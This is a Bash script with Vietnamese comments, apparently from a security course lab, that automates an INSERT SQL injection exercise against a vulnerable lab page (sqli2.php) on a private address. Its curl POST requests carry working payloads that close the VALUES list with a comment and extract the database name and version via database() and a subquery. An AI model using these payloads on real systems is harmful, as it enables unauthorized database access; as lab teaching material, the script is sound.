#!/bin/bash
# Kich ban Vi du 2 (Lab 05): Kiem thu lo hong INSERT SQL Injection (sqli2.php)
# Thuc hien cac buoc theo muc 5.2.2 trong Lab05_HD.pdf

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_LAB="$(cd "${SCRIPT_DIR}/.." && pwd)"

CONTAINER_ATTACKER="lab05_attacker"
IP_WEB="10.2.6.80"
POST_URL="http://${IP_WEB}/sqli/sqli2.php"
fail=0

note() { printf '\n===== %s =====\n' "$1"; }
pass() { echo "PASS: $1"; }
bad() { echo "FAIL: $1"; fail=1; }

note "[Buoc 1, 2, 3] Gui du lieu POST them san pham binh thuong"
echo "POST: cat=keyboard, vendor=Logitech, model=K120, price=10"
res1=$(sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=Logitech&model=K120&price=10" \
  "$POST_URL")
echo "$res1" | grep -A 5 "Logitech" && pass "Them san pham binh thuong thanh cong"

note "[Buoc 5 & 6] Tham do ki tu dau nhay don tren truong vendor"
echo "POST: vendor=anyVendor'"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27&model=Test&price=5" \
  "$POST_URL" | grep -i "error" || echo "[-] Server bao loi cu phap SQL hoac khong the them ban ghi"

note "[Buoc 7 & 8] Xac dinh thu tu cot va them thanh cong ban ghi voi dau chu thich (#)"
echo "POST: vendor=anyVendor', '1', '2', '3');#"
res2=$(sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+%271%27%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL")
echo "$res2" | grep -A 5 "anyVendor" && pass "Chen ban ghi thanh cong bang ky tu chu thich dong cau INSERT"

note "[Buoc 9] Khai thac do tham ten co so du lieu bang ham database()"
echo "POST: vendor=anyVendor', database(), '2', '3');#"
res3=$(sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+database%28%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL")
echo "$res3" | grep -A 5 "webvul" && pass "Trich xuat ten CSDL: webvul qua truong vendor"

note "[Buoc 10] Khai thac truy van con (Subquery) de lay phien ban CSDL"
echo "POST: vendor=anyVendor', (select version()), '2', '3');#"
res4=$(sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+%28select+version%28%29%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL")
echo "$res4" | grep -A 5 "anyVendor" && pass "Khai thac thanh cong phien ban CSDL qua Subquery"

echo
if [[ "$fail" -eq 0 ]]; then
  echo "KET QUA VI DU 2 (INSERT SQL INJECTION): PASS"
else
  echo "KET QUA VI DU 2 (INSERT SQL INJECTION): FAIL"
fi
exit "$fail"
